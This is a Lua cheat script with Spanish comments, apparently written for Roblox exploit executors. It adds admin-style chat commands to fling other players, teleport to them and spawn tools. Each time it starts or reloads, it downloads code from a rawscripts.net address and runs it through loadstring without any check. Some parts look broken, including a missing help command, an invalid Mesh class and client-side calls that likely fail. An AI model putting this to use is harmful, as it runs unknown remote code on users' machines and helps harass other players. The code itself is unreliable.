-- Script de administración mejorado para executor (Delta, Synapse, etc.)
-- Configuración
local PREFIX = "." -- Prefijo para los comandos
local ADMIN_NAME = "jrblacjr" -- Tu nombre de usuario de Roblox

-- Variables para bypass
local game = game
local getservice = game.GetService
local players = getservice(game, "Players")
local localplayer = players.LocalPlayer
local startergui = getservice(game, "StarterGui")
local debris = getservice(game, "Debris")

-- Función para mostrar mensajes en el chat
local function notify(text, color)
    local success, err = pcall(function()
        startergui:SetCore("ChatMakeSystemMessage", {
            Text = "[ADMIN] " .. text;
            Color = color or Color3.new(0, 1, 0);
        })
    end)
    
    if not success then
        warn("[ADMIN] " .. text)
    end
end

-- Cargar automáticamente el script adicional con bypass
local function loadAdditionalScript()
    local success, script = pcall(function()
        return getservice(game, "HttpService"):GetAsync("https://rawscripts.net/raw/Universal-Script-SystemBroken-New-2026-85435")
    end)
    
    if success then
        local loaded, error = loadstring(script)
        if loaded then
            local result, err = pcall(loaded)
            if not result then
                warn("[ADMIN] Error al ejecutar el script adicional: " .. tostring(err))
            else
                notify("Script adicional cargado correctamente", Color3.new(0, 1, 0))
            end
        else
            warn("[ADMIN] Error al compilar el script adicional: " .. tostring(error))
        end
    else
        warn("[ADMIN] Error al cargar el script adicional: " .. tostring(script))
    end
end

-- Comandos disponibles
local commands = {}

-- Comando para lanzar (fling) a un jugador aleatorio
commands["fling"] = function(args)
    local playersList = players:GetPlayers()
    local targetPlayer
    
    if args[1] and args[1]:lower() == "random" then
        -- Seleccionar un jugador aleatorio (excepto el administrador)
        local availablePlayers = {}
        for _, p in ipairs(playersList) do
            if p.Name ~= ADMIN_NAME then
                table.insert(availablePlayers, p)
            end
        end
        
        if #availablePlayers > 0 then
            targetPlayer = availablePlayers[math.random(#availablePlayers)]
        else
            notify("No hay otros jugadores disponibles para lanzar", Color3.new(1, 0, 0))
            return
        end
    else
        -- Buscar jugador por nombre
        local targetName = table.concat(args, " ")
        for _, p in ipairs(playersList) do
            if p.Name:lower():sub(1, #targetName) == targetName:lower() then
                targetPlayer = p
                break
            end
        end
        
        if not targetPlayer then
            notify("Jugador no encontrado: " .. targetName, Color3.new(1, 0, 0))
            return
        end
    end
    
    -- Aplicar el efecto de fling al jugador objetivo
    if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("Humanoid") then
        local humanoid = targetPlayer.Character.Humanoid
        local rootPart = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
        
        if rootPart then
            -- Aplicar una fuerza extrema para lanzar al jugador
            local bodyVelocity = Instance.new("BodyVelocity")
            bodyVelocity.Velocity = Vector3.new(math.random(-5000, 5000), 10000, math.random(-5000, 5000))
            bodyVelocity.P = 5000
            bodyVelocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
            bodyVelocity.Parent = rootPart
            
            -- Eliminar la fuerza después de un corto tiempo
            debris:AddItem(bodyVelocity, 0.1)
            
            -- Notificar al administrador
            notify("Jugador lanzado: " .. targetPlayer.Name, Color3.new(0, 1, 0))
        end
    end
end

-- Comando para teletransportarse a un jugador
commands["tp"] = function(args)
    local targetName = table.concat(args, " ")
    local player = localplayer
    
    if not player.Character or not player.Character:FindFirstChild("HumanoidRootPart") then
        notify("Tu personaje no está cargado completamente", Color3.new(1, 0, 0))
        return
    end
    
    for _, p in ipairs(players:GetPlayers()) do
        if p.Name:lower():sub(1, #targetName) == targetName:lower() then
            if p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
                player.Character.HumanoidRootPart.CFrame = p.Character.HumanoidRootPart.CFrame
                notify("Teletransportado a: " .. p.Name, Color3.new(0, 1, 0))
                return
            end
        end
    end
    
    notify("Jugador no encontrado: " .. targetName, Color3.new(1, 0, 0))
end

-- Comando para obtener herramientas
commands["tools"] = function()
    local player = localplayer
    local backpack = player:FindFirstChild("Backpack")
    
    if not backpack then 
        notify("No se encontró tu inventario", Color3.new(1, 0, 0))
        return 
    end
    
    -- Herramientas comunes en muchos juegos
    local toolNames = {"Sword", "Gun", "Tool", "Knife", "Bomb"}
    
    for _, toolName in ipairs(toolNames) do
        local tool = Instance.new("Tool")
        tool.Name = toolName
        
        -- Crear una parte para la herramienta
        local handle = Instance.new("Part")
        handle.Name = "Handle"
        handle.Size = Vector3.new(1, 1, 1)
        handle.Parent = tool
        
        -- Crear un mesh para que se vea mejor
        local mesh = Instance.new("Mesh")
        mesh.MeshType = Enum.MeshType.Sword
        mesh.Scale = Vector3.new(1, 1, 1)
        mesh.Parent = handle
        
        tool.Parent = backpack
    end
    
    notify("Herramientas añadidas al inventario", Color3.new(0, 1, 0))
end

-- Comando para recargar el script
commands["reload"] = function()
    notify("Recargando script...", Color3.new(1, 1, 0))
    loadAdditionalScript()
    notify("Script recargado", Color3.new(0, 1, 0))
end

-- Función para procesar los comandos
local function processCommand(message)
    -- Verificar si el mensaje comienza con el prefijo
    if message:sub(1, #PREFIX) == PREFIX then
        -- Verificar si es el administrador
        if localplayer.Name ~= ADMIN_NAME then
            return
        end
        
        -- Extraer el comando y los argumentos
        local cmd = message:sub(#PREFIX + 1)
        local args = {}
        for arg in cmd:gmatch("%S+") do
            table.insert(args, arg)
        end
        
        local commandName = table.remove(args, 1)
        
        -- Ejecutar el comando si existe
        if commands[commandName] then
            commands[commandName](args)
        else
            notify("Comando no encontrado: " .. (commandName or "desconocido"), Color3.new(1, 0, 0))
        end
    end
end

-- Esperar a que el jugador se cargue completamente
local function onPlayerAdded(player)
    if player == localplayer then
        -- Conectar el evento de chat
        player.Chatted:Connect(processCommand)
        
        -- Cargar el script adicional
        loadAdditionalScript()
        
        -- Notificar que el script está listo
        notify("Script de administración cargado. Usa " .. PREFIX .. "help para ver los comandos", Color3.new(0, 1, 0))
    end
end

-- Verificar si el jugador ya está en el juego
if localplayer then
    onPlayerAdded(localplayer)
else
    players.PlayerAdded:Connect(onPlayerAdded)
end
